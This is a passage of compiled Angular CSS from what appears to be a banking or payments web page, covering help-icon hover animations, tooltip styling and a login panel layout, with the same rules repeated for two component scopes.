        .tokyo_icon.simpleRowContextualInfoMode[_ngcontent-c46] {
            vertical-align: middle;
            font-size: 12px
        }

        .tokyo_main.simpleRowContextualInfoMode[_ngcontent-c46] {
            text-align: left;
            white-space: normal
        }

        @-webkit-keyframes belek-animatedAccountDetail {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 22px;
                top: 10px;
                left: -1px;
                height: 19px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedAccountDetail {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 22px;
                top: 10px;
                left: -1px;
                height: 19px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedServiceSubscription {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 21px;
                top: 10px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedServiceSubscription {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 21px;
                top: 10px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedSingleDebt {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 9px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedSingleDebt {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 9px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedPreRegistered {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedPreRegistered {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedHelpTextbox {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 60px;
                top: 10px;
                left: -1px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedHelpTextbox {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 60px;
                top: 10px;
                left: -1px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        .stream-help[_ngcontent-c46],
        .stream-view-2[_ngcontent-c46] {
            vertical-align: middle;
            font-size: 16px
        }

        .tokyo_content[_ngcontent-c46] {
            padding: 10px 15px;
            color: #333
        }

        .tokyo_loader[_ngcontent-c46] {
            overflow: hidden;
            min-height: 200px;
            height: 200px;
            margin-top: -20px
        }

        .tokyo_item[_ngcontent-c46] {
            display: table;
            padding: 3px 0
        }

        .tokyo_item_key[_ngcontent-c46] {
            display: table-cell;
            font-size: 12px;
            white-space: nowrap;
            padding-right: 6px
        }

        .tokyo_item_key[_ngcontent-c46]:after {
            content: ":"
        }

        .tokyo_item_value[_ngcontent-c46] {
            display: table-cell;
            font-size: 12px
        }

        .tokyo_header[_ngcontent-c46] {
            color: #333
        }

        .tokyo_header[_ngcontent-c46]:empty {
            display: none
        }

        .tokyo_content[_ngcontent-c46] .tokyo_item_key[_ngcontent-c46] {
            color: #666
        }

        .tokyo_content[_ngcontent-c46] .tokyo_item_value[_ngcontent-c46] {
            color: #4d4d4d
        }

        .tokyo_header.dark[_ngcontent-c46] {
            color: #f8f8f8
        }

        .tokyo_content.dark[_ngcontent-c46] {
            color: #f8f8f8;
            white-space: normal;
            font-size: 12px
        }

        .tokyo_content.dark[_ngcontent-c46] .tokyo_item_key[_ngcontent-c46] {
            color: #ccc
        }

        .tokyo_content.dark[_ngcontent-c46] .tokyo_item_value[_ngcontent-c46] {
            color: #e6e6e6
        }

        .tokyo_icon[_ngcontent-c46] i[_ngcontent-c46] {
            color: #0097c1;
            font-size: 16px
        }

        .tokyo_icon[_ngcontent-c46]:hover i[_ngcontent-c46] {
            color: #005b75;
            position: relative;
            z-index: 1
        }

        .tokyo_icon[_ngcontent-c46] i[_ngcontent-c46]:focus {
            outline: 0
        }

        .tokyo_icon[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            -webkit-animation: .1s belek-animated;
            animation: .1s belek-animated;
            height: 20px;
            top: 2px;
            left: 0;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        @-webkit-keyframes belek-animated {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        .belek-background[_ngcontent-c46] {
            position: absolute;
            width: 7px;
            top: 8px;
            left: 9px;
            height: 8px;
            background: 0 0;
            -webkit-animation: .1s belek-animated-reverse;
            animation: .1s belek-animated-reverse;
            border-radius: 2px
        }

        @-webkit-keyframes belek-animated-reverse {
            0% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse {
            0% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        .tokyo_icon[_ngcontent-c46] i.stream-help-circle[_ngcontent-c46]+.belek-background[_ngcontent-c46] {
            -webkit-animation: .1s belek-animated-reverse2;
            animation: .1s belek-animated-reverse2;
            width: 7px;
            top: 8px;
            left: 14px;
            height: 6px;
            background: 0 0;
            border-radius: 2px
        }

        .tokyo_icon[_ngcontent-c46]:hover i.stream-help-circle[_ngcontent-c46]+.belek-background[_ngcontent-c46] {
            -webkit-animation: .1s belek-animated2;
            animation: .1s belek-animated2;
            height: 24px;
            top: 6px;
            left: -2px;
            width: 24px;
            background: rgba(0, 0, 0, .05)
        }

        @-webkit-keyframes belek-animated2 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated2 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-reverse2 {
            0% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse2 {
            0% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @-webkit-keyframes belek-animated3 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated3 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-reverse3 {
            0% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse3 {
            0% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        .backoffice [_nghost-c46] .tokyo_icon[_ngcontent-c46] i[_ngcontent-c46] {
            color: #ff4800;
            font-size: 14px
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c46] {
            cursor: default
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c46] i.stream-help-circle[_ngcontent-c46]+.belek-background[_ngcontent-c46] {
            width: 7px;
            top: 8px;
            left: 9px;
            height: 8px;
            background: 0 0;
            -webkit-animation: .1s belek-animatedStepLogin-reverse;
            animation: .1s belek-animatedStepLogin-reverse
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c46]:hover i.stream-help-circle[_ngcontent-c46] {
            cursor: pointer
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c46]:hover i.stream-help-circle[_ngcontent-c46]+.belek-background[_ngcontent-c46] {
            height: 21px;
            width: 21px;
            background: rgba(0, 0, 0, .05);
            top: 7px;
            left: 0;
            -webkit-animation: .1s belek-animatedStepLogin;
            animation: .1s belek-animatedStepLogin
        }

        .tokyo_icon.error[_ngcontent-c46] i[_ngcontent-c46] {
            color: #ec2e33
        }

        .tokyo_icon.error[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            display: none
        }

        .tokyo_icon.warning[_ngcontent-c46] i[_ngcontent-c46] {
            color: #f57c00
        }

        .tokyo_icon.warning[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            display: none
        }

        .tokyo_icon.success[_ngcontent-c46] i[_ngcontent-c46] {
            color: #00a756
        }

        .tokyo_icon.success[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            display: none
        }

        .tokyo_icon.creditLineProductMode[_ngcontent-c46] .belek-background[_ngcontent-c46] {
            top: 16px;
            left: 8px;
            -webkit-animation: .1s belek-animated-CreditLineMode-reverse;
            animation: .1s belek-animated-CreditLineMode-reverse
        }

        .tokyo_icon.creditLineProductMode[_ngcontent-c46]:hover .belek-background[_ngcontent-c46] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animated-CreditLineMode;
            animation: .1s belek-animated-CreditLineMode
        }

        .tokyo_content.dark[_ngcontent-c46] .tokyo_item[_ngcontent-c46] .tokyo_item_value[_ngcontent-c46] {
            white-space: normal;
            vertical-align: top
        }

        @-webkit-keyframes belek-animated-CreditLineMode {
            0% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated-CreditLineMode {
            0% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-CreditLineMode-reverse {
            0% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-CreditLineMode-reverse {
            0% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }
        }
    </style>
<style>
        .ipswich[_ngcontent-c47] {
            width: 940px;
            margin: -54px auto 0;
            border: 1px solid #e1e1e1;
            position: relative;
            background: #fff;
            min-height: 380px;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1)
        }

        .ipswich-advertising[_ngcontent-c47] {
            height: 380px;
            width: 360px
        }

        .ipswich-main-firm-data[_ngcontent-c47] {
            padding: 0 18px
        }

        .ipswich-main-subtitle-description[_ngcontent-c47] {
            font-size: 14px;
            color: #444;
            padding: 5px 0 0
        }

        .error-message[_ngcontent-c47] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 5px 0 0;
            padding: 0;
            line-height: normal
        }

        .ok-message[_ngcontent-c47] {
            color: green;
            font-weight: 500;
            display: block;
            width: 100%;
            margin: 5px 0 0;
            padding: 0
        }

        .login-utils-link-message[_ngcontent-c47]:hover {
            text-decoration: underline;
            color: #005b75
        }

        .main-container-login-utils[_ngcontent-c47] {
            margin: 10px 0 4px
        }

        .ipswich-main-footer-description[_ngcontent-c47] {
            font-size: 12px;
            color: #444;
            display: inline-block;
            margin-top: 10px
        }

        .ipswich-main-footer-description[_ngcontent-c47] .login-utils-link-message[_ngcontent-c47] {
            display: inline
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich[_ngcontent-c47] {
                width: 740px;
                margin: -54px auto 0;
                min-height: auto
            }

            .ipswich-advertising[_ngcontent-c47] {
                width: 280px
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .ipswich[_ngcontent-c47] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c47] {
                float: none;
                margin: auto
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {
            .ipswich[_ngcontent-c47] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c47] {
                float: none;
                margin: auto
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich[_ngcontent-c47] {
                width: 100%;
                margin: 0 auto;
                min-height: auto;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c47] {
                float: none;
                margin: auto
            }
        }

        .login-utils-message[_ngcontent-c47] {
            font-weight: 500;
            display: inline;
            width: 100%;
            margin: 18px 0 0;
            padding: 0;
            text-align: left;
            color: #444;
            font-size: 12px;
            cursor: pointer
        }

        .login-utils-link-message[_ngcontent-c47] {
            font-weight: 500;
            display: block;
            width: 100%;
            margin: 18px 0 0;
            padding: 0;
            text-align: left;
            color: #0097c1;
            font-size: 12px;
            cursor: pointer
        }

        .main-container-login-utils[_ngcontent-c47] .ipswich-main-footer-description[_ngcontent-c47] {
            padding-bottom: 8px;
            width: 146px
        }

        .ipswich-main-footer-description[_ngcontent-c47] .ipswich-main-footer-description-label[_ngcontent-c47] {
            width: 146px
        }
    </style>
<style>
        .tokyo_icon[_ngcontent-c47] {
            font-size: 18px;
            padding: 6px 6px 6px 3px;
            cursor: pointer;
            position: relative
        }

        .tokyo_icon.preregisteredMode[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.preregisteredMode[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.addHocMode[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.addHocMode[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.debtRowMode[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.debtRowMode[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animatedPreRegistered;
            animation: .1s belek-animatedPreRegistered;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.singleOnlineDebtMode[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.singleOnlineDebtMode[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            top: 9px;
            left: -2px;
            -webkit-animation: .1s belek-animatedSingleDebt;
            animation: .1s belek-animatedSingleDebt;
            height: 20px;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.textHelpMode[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.textHelpMode[_ngcontent-c47] .linkTextResource[_ngcontent-c47] {
            color: #0097c1;
            font-size: 12px;
            display: inline-block
        }

        .tokyo_icon.textHelpMode[_ngcontent-c47] .linkTextResource[_ngcontent-c47]:hover {
            color: #005b75
        }

        .tokyo_icon.textHelpMode[_ngcontent-c47] .linkTextResource[_ngcontent-c47]+i[_ngcontent-c47] {
            font-size: 12px
        }

        .tokyo_icon.textHelpMode[_ngcontent-c47]:hover .linkTextResource[_ngcontent-c47] {
            color: #005b75
        }

        .tokyo_icon.textHelpMode[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            top: 10px;
            left: -1px;
            -webkit-animation: .1s belek-animatedHelpTextbox;
            animation: .1s belek-animatedHelpTextbox;
            height: 20px;
            width: 60px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            top: 10px;
            left: 0;
            -webkit-animation: .1s belek-animatedServiceSubscription;
            animation: .1s belek-animatedServiceSubscription;
            height: 20px;
            width: 21px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.servicesubscriptionMode[_ngcontent-c47] i[_ngcontent-c47] {
            font-size: 14px
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            top: 16px;
            left: 7px;
            -webkit-animation: none;
            animation: none;
            height: 8px;
            width: 7px;
            background: 0 0
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            top: 10px;
            left: -1px;
            -webkit-animation: .1s belek-animatedAccountDetail;
            animation: .1s belek-animatedAccountDetail;
            height: 19px;
            width: 22px;
            background: rgba(0, 0, 0, .05)
        }

        .tokyo_icon.detailaccoutMode[_ngcontent-c47] i[_ngcontent-c47] {
            font-size: 14px
        }

        .tokyo_icon.simpleRowContextualInfoMode[_ngcontent-c47] {
            vertical-align: middle;
            font-size: 12px
        }

        .tokyo_main.simpleRowContextualInfoMode[_ngcontent-c47] {
            text-align: left;
            white-space: normal
        }

        @-webkit-keyframes belek-animatedAccountDetail {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 22px;
                top: 10px;
                left: -1px;
                height: 19px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedAccountDetail {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 22px;
                top: 10px;
                left: -1px;
                height: 19px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedServiceSubscription {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 21px;
                top: 10px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedServiceSubscription {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 21px;
                top: 10px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedSingleDebt {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 9px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedSingleDebt {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 9px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedPreRegistered {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedPreRegistered {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animatedHelpTextbox {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 60px;
                top: 10px;
                left: -1px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animatedHelpTextbox {
            0% {
                width: 7px;
                top: 16px;
                left: 7px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 60px;
                top: 10px;
                left: -1px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        .stream-help[_ngcontent-c47],
        .stream-view-2[_ngcontent-c47] {
            vertical-align: middle;
            font-size: 16px
        }

        .tokyo_content[_ngcontent-c47] {
            padding: 10px 15px;
            color: #333
        }

        .tokyo_loader[_ngcontent-c47] {
            overflow: hidden;
            min-height: 200px;
            height: 200px;
            margin-top: -20px
        }

        .tokyo_item[_ngcontent-c47] {
            display: table;
            padding: 3px 0
        }

        .tokyo_item_key[_ngcontent-c47] {
            display: table-cell;
            font-size: 12px;
            white-space: nowrap;
            padding-right: 6px
        }

        .tokyo_item_key[_ngcontent-c47]:after {
            content: ":"
        }

        .tokyo_item_value[_ngcontent-c47] {
            display: table-cell;
            font-size: 12px
        }

        .tokyo_header[_ngcontent-c47] {
            color: #333
        }

        .tokyo_header[_ngcontent-c47]:empty {
            display: none
        }

        .tokyo_content[_ngcontent-c47] .tokyo_item_key[_ngcontent-c47] {
            color: #666
        }

        .tokyo_content[_ngcontent-c47] .tokyo_item_value[_ngcontent-c47] {
            color: #4d4d4d
        }

        .tokyo_header.dark[_ngcontent-c47] {
            color: #f8f8f8
        }

        .tokyo_content.dark[_ngcontent-c47] {
            color: #f8f8f8;
            white-space: normal;
            font-size: 12px
        }

        .tokyo_content.dark[_ngcontent-c47] .tokyo_item_key[_ngcontent-c47] {
            color: #ccc
        }

        .tokyo_content.dark[_ngcontent-c47] .tokyo_item_value[_ngcontent-c47] {
            color: #e6e6e6
        }

        .tokyo_icon[_ngcontent-c47] i[_ngcontent-c47] {
            color: #0097c1;
            font-size: 16px
        }

        .tokyo_icon[_ngcontent-c47]:hover i[_ngcontent-c47] {
            color: #005b75;
            position: relative;
            z-index: 1
        }

        .tokyo_icon[_ngcontent-c47] i[_ngcontent-c47]:focus {
            outline: 0
        }

        .tokyo_icon[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            -webkit-animation: .1s belek-animated;
            animation: .1s belek-animated;
            height: 20px;
            top: 2px;
            left: 0;
            width: 26px;
            background: rgba(0, 0, 0, .05)
        }

        @-webkit-keyframes belek-animated {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        .belek-background[_ngcontent-c47] {
            position: absolute;
            width: 7px;
            top: 8px;
            left: 9px;
            height: 8px;
            background: 0 0;
            -webkit-animation: .1s belek-animated-reverse;
            animation: .1s belek-animated-reverse;
            border-radius: 2px
        }

        @-webkit-keyframes belek-animated-reverse {
            0% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse {
            0% {
                width: 26px;
                top: 2px;
                left: 0;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        .tokyo_icon[_ngcontent-c47] i.stream-help-circle[_ngcontent-c47]+.belek-background[_ngcontent-c47] {
            -webkit-animation: .1s belek-animated-reverse2;
            animation: .1s belek-animated-reverse2;
            width: 7px;
            top: 8px;
            left: 14px;
            height: 6px;
            background: 0 0;
            border-radius: 2px
        }

        .tokyo_icon[_ngcontent-c47]:hover i.stream-help-circle[_ngcontent-c47]+.belek-background[_ngcontent-c47] {
            -webkit-animation: .1s belek-animated2;
            animation: .1s belek-animated2;
            height: 24px;
            top: 6px;
            left: -2px;
            width: 24px;
            background: rgba(0, 0, 0, .05)
        }

        @-webkit-keyframes belek-animated2 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated2 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-reverse2 {
            0% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse2 {
            0% {
                height: 20px;
                top: 6px;
                left: 0;
                width: 24px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @-webkit-keyframes belek-animated3 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated3 {
            0% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }

            100% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-reverse3 {
            0% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-reverse3 {
            0% {
                height: 20px;
                top: 5px;
                left: 0;
                width: 23px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 9px;
                height: 8px;
                background: 0 0
            }
        }

        .backoffice [_nghost-c47] .tokyo_icon[_ngcontent-c47] i[_ngcontent-c47] {
            color: #ff4800;
            font-size: 14px
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c47] {
            cursor: default
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c47] i.stream-help-circle[_ngcontent-c47]+.belek-background[_ngcontent-c47] {
            width: 7px;
            top: 8px;
            left: 9px;
            height: 8px;
            background: 0 0;
            -webkit-animation: .1s belek-animatedStepLogin-reverse;
            animation: .1s belek-animatedStepLogin-reverse
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c47]:hover i.stream-help-circle[_ngcontent-c47] {
            cursor: pointer
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c47]:hover i.stream-help-circle[_ngcontent-c47]+.belek-background[_ngcontent-c47] {
            height: 21px;
            width: 21px;
            background: rgba(0, 0, 0, .05);
            top: 7px;
            left: 0;
            -webkit-animation: .1s belek-animatedStepLogin;
            animation: .1s belek-animatedStepLogin
        }

        .tokyo_icon.error[_ngcontent-c47] i[_ngcontent-c47] {
            color: #ec2e33
        }

        .tokyo_icon.error[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            display: none
        }

